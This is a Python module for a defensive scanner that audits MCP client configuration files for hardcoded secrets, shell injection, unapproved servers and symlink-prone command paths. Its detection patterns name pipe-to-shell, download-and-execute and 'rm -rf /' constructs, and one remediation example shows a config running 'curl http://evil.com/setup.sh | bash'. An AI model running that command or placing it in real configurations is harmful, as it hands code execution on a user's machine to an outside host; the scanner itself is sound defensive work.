"""MCPSec — Configuration Auditor.

Scans MCP client configuration files for security issues including
hardcoded credentials, shell injection in startup args, shadow servers,
and symlink attacks on server paths.

M2 scope: Static detection mode (CONFIG-001, CONFIG-002, CONFIG-003, CONFIG-004)
"""

from __future__ import annotations

import json
import math
import os
import re
import stat
from pathlib import Path
from typing import Any, Optional

from mcpsec.exceptions import ConfigParseError, FileAccessError
from mcpsec.models.findings import (
    Auditor,
    Confidence,
    DetectionMode,
    Finding,
    RemediationEffort,
    RequirementLevel,
    Severity,
    StandardReference,
)
from mcpsec.scanner import BaseAuditor


# ---------------------------------------------------------------------------
# Known MCP config file locations by client
# ---------------------------------------------------------------------------

_CONFIG_LOCATIONS: dict[str, list[Path]] = {
    "claude_desktop": [
        Path.home() / "Library" / "Application Support" / "Claude" / "claude_desktop_config.json",
        Path.home() / ".config" / "claude" / "claude_desktop_config.json",
        Path.home() / "AppData" / "Roaming" / "Claude" / "claude_desktop_config.json",
    ],
    "claude_code": [
        Path.home() / ".claude" / "mcp.json",
    ],
    "vscode": [
        Path.home() / ".config" / "Code" / "User" / "settings.json",
        Path.home() / "Library" / "Application Support" / "Code" / "User" / "settings.json",
        Path.home() / "AppData" / "Roaming" / "Code" / "User" / "settings.json",
    ],
    "cursor": [
        Path.home() / ".cursor" / "mcp.json",
        Path.home() / "Library" / "Application Support" / "Cursor" / "User" / "settings.json",
        Path.home() / ".config" / "Cursor" / "User" / "settings.json",
    ],
    "project": [
        Path(".mcp.json"),
        Path("mcp.json"),
        Path(".mcp/config.json"),
    ],
}


# ---------------------------------------------------------------------------
# Secret detection patterns
# ---------------------------------------------------------------------------

_SECRET_PATTERNS: list[tuple[re.Pattern, str]] = [
    # API keys by provider
    (re.compile(r"sk-[a-zA-Z0-9]{20,}"), "OpenAI API key"),
    (re.compile(r"sk-ant-[a-zA-Z0-9-]{20,}"), "Anthropic API key"),
    (re.compile(r"AIza[0-9A-Za-z_-]{35}"), "Google API key"),
    (re.compile(r"ghp_[a-zA-Z0-9]{36}"), "GitHub personal access token"),
    (re.compile(r"gho_[a-zA-Z0-9]{36}"), "GitHub OAuth token"),
    (re.compile(r"github_pat_[a-zA-Z0-9_]{22,}"), "GitHub fine-grained PAT"),
    (re.compile(r"glpat-[a-zA-Z0-9_-]{20,}"), "GitLab personal access token"),
    (re.compile(r"xoxb-[0-9]{10,}-[0-9]{10,}-[a-zA-Z0-9]{24}"), "Slack bot token"),
    (re.compile(r"xoxp-[0-9]{10,}-[0-9]{10,}-[a-zA-Z0-9]{24}"), "Slack user token"),
    (re.compile(r"AKIA[0-9A-Z]{16}"), "AWS access key ID"),
    (re.compile(r"npm_[a-zA-Z0-9]{36}"), "npm access token"),

    # Generic patterns
    (re.compile(r"['\"]?(?:api[_-]?key|apikey|api[_-]?secret)['\"]?\s*[:=]\s*['\"][a-zA-Z0-9_-]{16,}['\"]", re.IGNORECASE), "Generic API key"),
    (re.compile(r"['\"]?(?:password|passwd|pwd)['\"]?\s*[:=]\s*['\"][^'\"]{8,}['\"]", re.IGNORECASE), "Password in config"),
    (re.compile(r"['\"]?(?:secret|token|auth)['\"]?\s*[:=]\s*['\"][a-zA-Z0-9_-]{16,}['\"]", re.IGNORECASE), "Secret/token in config"),
    (re.compile(r"-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----"), "Private key"),
    (re.compile(r"Bearer\s+[a-zA-Z0-9._-]{20,}"), "Bearer token"),
]

# Shannon entropy threshold for high-entropy string detection
_ENTROPY_THRESHOLD = 4.0
_ENTROPY_MIN_LENGTH = 16


# ---------------------------------------------------------------------------
# Shell injection patterns
# ---------------------------------------------------------------------------

_SHELL_INJECTION_PATTERNS: list[tuple[re.Pattern, str]] = [
    (re.compile(r"[;&|`]"), "Shell metacharacter (;, &, |, `)"),
    (re.compile(r"\$\("), "Command substitution $(...)"),
    (re.compile(r"\$\{"), "Variable expansion ${...}"),
    (re.compile(r">\s*/"), "Output redirect to absolute path"),
    (re.compile(r"\|\s*(?:bash|sh|zsh|cmd|powershell)", re.IGNORECASE), "Pipe to shell"),
    (re.compile(r"(?:^|\s)(?:curl|wget|fetch)\s+.+\|\s*(?:bash|sh)", re.IGNORECASE), "Download and execute pattern"),
    (re.compile(r"eval\s+"), "eval usage"),
    (re.compile(r"(?:^|\s)(?:rm|del)\s+-rf?\s+/", re.IGNORECASE), "Destructive command with root path"),
]


class ConfigAuditor(BaseAuditor):
    """Audits MCP configuration files for security issues.

    Static checks (M2 — requires filesystem access):
        CONFIG-001  Hardcoded credentials in config file
        CONFIG-002  Shell injection via startup command args
        CONFIG-003  Shadow MCP server detected
        CONFIG-004  Symlink attack vulnerability in server path
    """

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self._approved_servers: set[str] = set()

    @property
    def auditor_type(self) -> Auditor:
        return Auditor.CONFIG

    def set_approved_servers(self, servers: set[str]) -> None:
        """Set the list of approved/known MCP servers for shadow detection."""
        self._approved_servers = servers

    async def audit(self) -> list[Finding]:
        """Run all config checks."""
        self._clear_findings()

        if not self._should_run_check(DetectionMode.STATIC):
            return self._findings

        configs = self._discover_configs()

        for config_path, config_data, client_name in configs:
            servers = self._extract_servers(config_data, client_name)

            for server_name, server_config in servers.items():
                self._check_hardcoded_credentials(
                    config_path, server_name, server_config
                )
                self._check_shell_injection(
                    config_path, server_name, server_config
                )
                self._check_shadow_server(
                    config_path, server_name, server_config, client_name
                )
                self._check_symlink_attack(
                    config_path, server_name, server_config
                )

        return self._findings

    # ==================================================================
    # Config discovery
    # ==================================================================

    def _discover_configs(self) -> list[tuple[Path, dict, str]]:
        """Discover and parse MCP config files.

        If target_path is provided, scans that specific path.
        Otherwise, scans all known config locations.

        Returns list of (path, parsed_data, client_name) tuples.
        """
        configs = []

        if self.target_path:
            path = Path(self.target_path)
            if path.is_file():
                data = self._parse_config(path)
                if data is not None:
                    client = self._detect_client(path)
                    configs.append((path, data, client))
            elif path.is_dir():
                for json_file in path.rglob("*.json"):
                    if self._is_mcp_config(json_file):
                        data = self._parse_config(json_file)
                        if data is not None:
                            client = self._detect_client(json_file)
                            configs.append((json_file, data, client))
        else:
            for client_name, paths in _CONFIG_LOCATIONS.items():
                for path in paths:
                    if path.exists() and path.is_file():
                        data = self._parse_config(path)
                        if data is not None:
                            configs.append((path, data, client_name))

        return configs

    def _parse_config(self, path: Path) -> Optional[dict]:
        """Safely parse a JSON config file."""
        try:
            text = path.read_text(encoding="utf-8")
            return json.loads(text)
        except (OSError, json.JSONDecodeError):
            return None

    def _detect_client(self, path: Path) -> str:
        """Detect which MCP client a config file belongs to."""
        path_str = str(path).lower()
        if "claude" in path_str and "desktop" in path_str:
            return "claude_desktop"
        if ".claude" in path_str:
            return "claude_code"
        if "cursor" in path_str:
            return "cursor"
        if "code" in path_str:
            return "vscode"
        return "unknown"

    def _is_mcp_config(self, path: Path) -> bool:
        """Check if a JSON file looks like an MCP config."""
        name = path.name.lower()
        return name in (
            "mcp.json", ".mcp.json", "claude_desktop_config.json",
            "settings.json", "config.json",
        )

    def _extract_servers(
        self, config: dict, client_name: str
    ) -> dict[str, dict]:
        """Extract MCP server definitions from a config file.

        Handles different config formats across clients.
        """
        servers: dict[str, dict] = {}

        # Claude Desktop format: { "mcpServers": { "name": { ... } } }
        if "mcpServers" in config:
            servers.update(config["mcpServers"])

        # Claude Code / project format: { "servers": { "name": { ... } } }
        if "servers" in config:
            servers.update(config["servers"])

        # VS Code format: { "mcp.servers": { "name": { ... } } }
        if "mcp.servers" in config:
            servers.update(config["mcp.servers"])

        # VS Code nested: { "mcp": { "servers": { ... } } }
        if "mcp" in config and isinstance(config["mcp"], dict):
            if "servers" in config["mcp"]:
                servers.update(config["mcp"]["servers"])

        return servers

    # ==================================================================
    # CONFIG-001: Hardcoded Credentials
    # ==================================================================

    def _check_hardcoded_credentials(
        self, config_path: Path, server_name: str, server_config: dict
    ) -> None:
        """CONFIG-001: Scan server config for hardcoded secrets."""
        config_str = json.dumps(server_config)
        found_secrets: list[dict[str, str]] = []

        # Pattern matching
        for pattern, label in _SECRET_PATTERNS:
            matches = pattern.findall(config_str)
            for match in matches:
                # Mask the secret for evidence
                masked = match[:6] + "..." + match[-4:] if len(match) > 12 else "***"
                found_secrets.append({"type": label, "masked": masked})

        # High-entropy string detection in env/args values
        env_values = self._extract_string_values(server_config)
        for key, value in env_values:
            if (len(value) >= _ENTROPY_MIN_LENGTH and
                    self._shannon_entropy(value) >= _ENTROPY_THRESHOLD):
                # Check it's not a well-known non-secret pattern
                if not self._is_known_safe_value(value):
                    found_secrets.append({
                        "type": f"High-entropy string in '{key}'",
                        "masked": value[:6] + "..." + value[-4:],
                    })

        if not found_secrets:
            return

        evidence_parts = [
            f"  - {s['type']}: {s['masked']}" for s in found_secrets[:10]
        ]
        if len(found_secrets) > 10:
            evidence_parts.append(f"  ... and {len(found_secrets) - 10} more")

        self._add_finding(Finding(
            finding_id="MCP-CONFIG-001",
            title="Hardcoded Credentials in Config File",
            auditor=Auditor.CONFIG,
            severity=Severity.CRITICAL,
            cvss_score=9.0,
            cvss_vector="CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
            cwe_id="CWE-798",
            cwe_name="Use of Hard-coded Credentials",
            detection_mode=DetectionMode.STATIC,
            confidence=Confidence.HIGH,
            detection_method="Pattern matching against known API key formats and "
                            "Shannon entropy analysis for high-entropy strings in config values.",
            remote_scan_applicable=False,
            standards=[
                StandardReference(
                    id="OWASP-MCP01",
                    ref="OWASP MCP Top 10 v0.1",
                    section="MCP01 — Token Mismanagement & Secret Exposure",
                    requirement_level=RequirementLevel.NOT_APPLICABLE,
                ),
                StandardReference(
                    id="OWASP-LLM08",
                    ref="OWASP Top 10 for LLM Applications 2025",
                    section="LLM08 — Excessive Agency",
                    requirement_level=RequirementLevel.NOT_APPLICABLE,
                ),
                StandardReference(
                    id="NIST-RMF-GOVERN",
                    ref="NIST AI Risk Management Framework",
                    section="Govern 1.3 — Processes for managing AI risks",
                    requirement_level=RequirementLevel.NOT_APPLICABLE,
                ),
            ],
            evidence=f"Config: {config_path}\nServer: '{server_name}'\n"
                     f"{len(found_secrets)} credential(s) detected:\n"
                     + "\n".join(evidence_parts),
            risk="Hardcoded API keys, tokens, and passwords in config files are "
                 "exposed to anyone with filesystem access. If the config is committed "
                 "to version control, secrets leak to the entire repository history. "
                 "Secrets in MCP configs grant direct access to upstream APIs.",
            recommendation="Use environment variable references instead of hardcoded values. "
                          "Most MCP clients support ${ENV_VAR} syntax in config files. "
                          "Store secrets in a secrets manager or .env file (gitignored).",
            code_example=(
                '# BAD — hardcoded secret\n'
                '{\n'
                '  "mcpServers": {\n'
                '    "my-server": {\n'
                '      "env": {\n'
                '        "API_KEY": "sk-ant-abc123..."  // ❌\n'
                '      }\n'
                '    }\n'
                '  }\n'
                '}\n\n'
                '# GOOD — environment variable reference\n'
                '{\n'
                '  "mcpServers": {\n'
                '    "my-server": {\n'
                '      "env": {\n'
                '        "API_KEY": "${ANTHROPIC_API_KEY}"  // ✅\n'
                '      }\n'
                '    }\n'
                '  }\n'
                '}'
            ),
            remediation_effort=RemediationEffort.LOW,
            remediation_priority=1,
        ))

    # ==================================================================
    # CONFIG-002: Shell Injection via Startup Args
    # ==================================================================

    def _check_shell_injection(
        self, config_path: Path, server_name: str, server_config: dict
    ) -> None:
        """CONFIG-002: Check startup command and args for shell injection."""
        command = server_config.get("command", "")
        args = server_config.get("args", [])

        injection_findings: list[dict[str, str]] = []

        # Check command itself
        if command:
            for pattern, label in _SHELL_INJECTION_PATTERNS:
                if pattern.search(command):
                    injection_findings.append({
                        "location": "command",
                        "value": command,
                        "pattern": label,
                    })

        # Check each arg
        if isinstance(args, list):
            for i, arg in enumerate(args):
                if not isinstance(arg, str):
                    continue
                for pattern, label in _SHELL_INJECTION_PATTERNS:
                    if pattern.search(arg):
                        injection_findings.append({
                            "location": f"args[{i}]",
                            "value": arg[:100],
                            "pattern": label,
                        })

        if not injection_findings:
            return

        evidence_parts = [
            f"  - {f['location']}: '{f['value']}' → {f['pattern']}"
            for f in injection_findings
        ]

        self._add_finding(Finding(
            finding_id="MCP-CONFIG-002",
            title="Shell Injection via Startup Command Args",
            auditor=Auditor.CONFIG,
            severity=Severity.CRITICAL,
            cvss_score=9.1,
            cvss_vector="CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
            cwe_id="CWE-78",
            cwe_name="Improper Neutralization of Special Elements used in an OS Command",
            detection_mode=DetectionMode.STATIC,
            confidence=Confidence.HIGH,
            detection_method="Pattern matching against shell metacharacters, command substitution, "
                            "pipe operators, and download-execute patterns in config command and args.",
            remote_scan_applicable=False,
            standards=[
                StandardReference(
                    id="OWASP-MCP05",
                    ref="OWASP MCP Top 10 v0.1",
                    section="MCP05 — Command Injection & Execution",
                    requirement_level=RequirementLevel.NOT_APPLICABLE,
                ),
                StandardReference(
                    id="OWASP-MCP09",
                    ref="OWASP MCP Top 10 v0.1",
                    section="MCP09 — Shadow MCP Servers",
                    requirement_level=RequirementLevel.NOT_APPLICABLE,
                ),
                StandardReference(
                    id="OWASP-LLM02",
                    ref="OWASP Top 10 for LLM Applications 2025",
                    section="LLM02 — Insecure Output Handling",
                    requirement_level=RequirementLevel.NOT_APPLICABLE,
                ),
            ],
            evidence=f"Config: {config_path}\nServer: '{server_name}'\n"
                     f"Command: '{command}'\n"
                     f"{len(injection_findings)} injection pattern(s):\n"
                     + "\n".join(evidence_parts),
            risk="Shell metacharacters in MCP server startup commands enable arbitrary "
                 "command execution when the MCP client launches the server. An attacker "
                 "who can modify the config file (or a supply chain attack on a shared "
                 "config template) gains code execution in the user's environment.",
            recommendation="Use array-style arguments without shell metacharacters. "
                          "Never use shell=True patterns. Validate all command paths "
                          "are absolute and point to expected executables.",
            code_example=(
                '# BAD — shell injection risk\n'
                '{\n'
                '  "command": "sh",\n'
                '  "args": ["-c", "curl http://evil.com/setup.sh | bash"]  // ❌\n'
                '}\n\n'
                '# GOOD — direct execution, no shell\n'
                '{\n'
                '  "command": "/usr/local/bin/node",\n'
                '  "args": ["server.js", "--port", "3000"]  // ✅\n'
                '}'
            ),
            remediation_effort=RemediationEffort.LOW,
            remediation_priority=1,
        ))

    # ==================================================================
    # CONFIG-003: Shadow MCP Server
    # ==================================================================

    def _check_shadow_server(
        self,
        config_path: Path,
        server_name: str,
        server_config: dict,
        client_name: str,
    ) -> None:
        """CONFIG-003: Detect MCP servers not in approved list."""
        if not self._approved_servers:
            return

        # Build identifier from server config
        command = server_config.get("command", "")
        url = server_config.get("url", "")
        identifier = url or f"{command} {' '.join(server_config.get('args', []))}"

        if server_name not in self._approved_servers and identifier not in self._approved_servers:
            self._add_finding(Finding(
                finding_id="MCP-CONFIG-003",
                title="Shadow MCP Server Detected",
                auditor=Auditor.CONFIG,
                severity=Severity.HIGH,
                cvss_score=7.8,
                cvss_vector="CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
                cwe_id="CWE-1329",
                cwe_name="Reliance on Component That is Not Updateable",
                detection_mode=DetectionMode.STATIC,
                confidence=Confidence.HIGH,
                detection_method="Compared configured MCP servers against approved server list. "
                                "Server not found in allowlist.",
                remote_scan_applicable=False,
                standards=[
                    StandardReference(
                        id="OWASP-MCP09",
                        ref="OWASP MCP Top 10 v0.1",
                        section="MCP09 — Shadow MCP Servers",
                        requirement_level=RequirementLevel.NOT_APPLICABLE,
                    ),
                    StandardReference(
                        id="OWASP-ASI09",
                        ref="genai.owasp.org",
                        section="ASI09 — Rogue/Shadow Agents",
                        requirement_level=RequirementLevel.NOT_APPLICABLE,
                    ),
                    StandardReference(
                        id="NIST-RMF-MAP",
                        ref="NIST AI Risk Management Framework",
                        section="Map 1.5 — Impacts to individuals, groups, communities",
                        requirement_level=RequirementLevel.NOT_APPLICABLE,
                    ),
                ],
                evidence=f"Config: {config_path}\nClient: {client_name}\n"
                         f"Server: '{server_name}'\n"
                         f"Identifier: {identifier}\n"
                         "Not found in approved server registry.",
                risk="Unapproved MCP servers operate outside organizational security controls. "
                     "They may lack authentication, expose sensitive data, or be malicious. "
                     "Shadow servers bypass security reviews and audit trails.",
                recommendation="Add this server to the approved server registry after security review, "
                              "or remove it from the configuration. Maintain a centralized allowlist "
                              "of approved MCP servers for your organization.",
                remediation_effort=RemediationEffort.MEDIUM,
                remediation_priority=5,
            ))

    # ==================================================================
    # CONFIG-004: Symlink Attack
    # ==================================================================

    def _check_symlink_attack(
        self, config_path: Path, server_name: str, server_config: dict
    ) -> None:
        """CONFIG-004: Check server command path for symlink vulnerabilities."""
        command = server_config.get("command", "")
        if not command:
            return

        command_path = Path(command)

        # Only check absolute or resolvable paths
        if not command_path.is_absolute():
            # Try to resolve via PATH-like logic
            # For relative paths, check in current directory
            if not command_path.exists():
                return

        issues: list[str] = []

        try:
            # Check if command is a symlink
            if command_path.is_symlink():
                real_path = command_path.resolve()
                issues.append(
                    f"Command '{command}' is a symlink → {real_path}"
                )

                # Check if symlink target is outside expected directory
                try:
                    command_path.resolve().relative_to(command_path.parent.resolve())
                except ValueError:
                    issues.append(
                        f"Symlink target {real_path} is outside the command directory"
                    )

            # Check if command path is writable by non-owner
            if command_path.exists():
                file_stat = command_path.stat()
                mode = file_stat.st_mode

                # Check group and other write permissions
                if mode & stat.S_IWGRP:
                    issues.append("Command path is group-writable")
                if mode & stat.S_IWOTH:
                    issues.append("Command path is world-writable")

                # Check parent directory write permissions
                parent = command_path.parent
                if parent.exists():
                    parent_stat = parent.stat()
                    if parent_stat.st_mode & stat.S_IWOTH:
                        issues.append("Command parent directory is world-writable")

        except OSError:
            return

        if not issues:
            return

        self._add_finding(Finding(
            finding_id="MCP-CONFIG-004",
            title="Symlink Attack Vulnerability in Server Path",
            auditor=Auditor.CONFIG,
            severity=Severity.HIGH,
            cvss_score=7.5,
            cvss_vector="CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
            cwe_id="CWE-61",
            cwe_name="UNIX Symbolic Link (Symlink) Following",
            detection_mode=DetectionMode.STATIC,
            confidence=Confidence.MEDIUM,
            detection_method="Filesystem analysis of server command path for symlinks, "
                            "file permissions, and directory writability.",
            remote_scan_applicable=False,
            standards=[
                StandardReference(
                    id="OWASP-MCP05",
                    ref="OWASP MCP Top 10 v0.1",
                    section="MCP05 — Command Injection & Execution",
                    requirement_level=RequirementLevel.NOT_APPLICABLE,
                ),
            ],
            evidence=f"Config: {config_path}\nServer: '{server_name}'\n"
                     f"Command: '{command}'\n"
                     f"Issues:\n" + "\n".join(f"  - {i}" for i in issues),
            risk="A symlinked or writable command path allows an attacker to redirect "
                 "the MCP server launch to a malicious binary. If the command path or "
                 "its parent directory is writable by other users, a local privilege "
                 "escalation attack is possible.",
            recommendation="Use absolute paths to server executables. Ensure command binaries "
                          "and their parent directories are not writable by non-owners. "
                          "Resolve symlinks and verify the target before execution.",
            code_example=(
                '# BAD — relative path, could be symlinked\n'
                '{\n'
                '  "command": "node",\n'
                '  "args": ["server.js"]  // ❌ resolved via PATH\n'
                '}\n\n'
                '# GOOD — absolute, verified path\n'
                '{\n'
                '  "command": "/usr/local/bin/node",\n'
                '  "args": ["/opt/mcp-server/server.js"]  // ✅\n'
                '}'
            ),
            remediation_effort=RemediationEffort.MEDIUM,
            remediation_priority=6,
        ))

    # ==================================================================
    # Helpers
    # ==================================================================

    def _extract_string_values(
        self, config: dict, prefix: str = ""
    ) -> list[tuple[str, str]]:
        """Recursively extract all string values from a config dict.

        Returns list of (key_path, value) tuples.
        """
        results = []
        for key, value in config.items():
            key_path = f"{prefix}.{key}" if prefix else key
            if isinstance(value, str):
                results.append((key_path, value))
            elif isinstance(value, dict):
                results.extend(self._extract_string_values(value, key_path))
            elif isinstance(value, list):
                for i, item in enumerate(value):
                    if isinstance(item, str):
                        results.append((f"{key_path}[{i}]", item))
                    elif isinstance(item, dict):
                        results.extend(
                            self._extract_string_values(item, f"{key_path}[{i}]")
                        )
        return results

    @staticmethod
    def _shannon_entropy(text: str) -> float:
        """Calculate Shannon entropy of a string.

        Higher entropy indicates more randomness — likely a secret.
        Typical thresholds: >4.0 = suspicious, >4.5 = very likely secret.
        """
        if not text:
            return 0.0
        length = len(text)
        freq: dict[str, int] = {}
        for char in text:
            freq[char] = freq.get(char, 0) + 1
        entropy = 0.0
        for count in freq.values():
            prob = count / length
            if prob > 0:
                entropy -= prob * math.log2(prob)
        return entropy

    @staticmethod
    def _is_known_safe_value(value: str) -> bool:
        """Check if a high-entropy string is a known safe pattern."""
        safe_patterns = [
            # UUIDs
            re.compile(r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$", re.IGNORECASE),
            # Hex hashes (SHA-256, etc.)
            re.compile(r"^[0-9a-f]{40,}$", re.IGNORECASE),
            # Base64 encoded common values
            re.compile(r"^[A-Za-z0-9+/]+=*$"),
            # URLs
            re.compile(r"^https?://"),
            # File paths
            re.compile(r"^[/~]"),
            # Version strings
            re.compile(r"^\d+\.\d+"),
        ]
        return any(p.match(value) for p in safe_patterns)
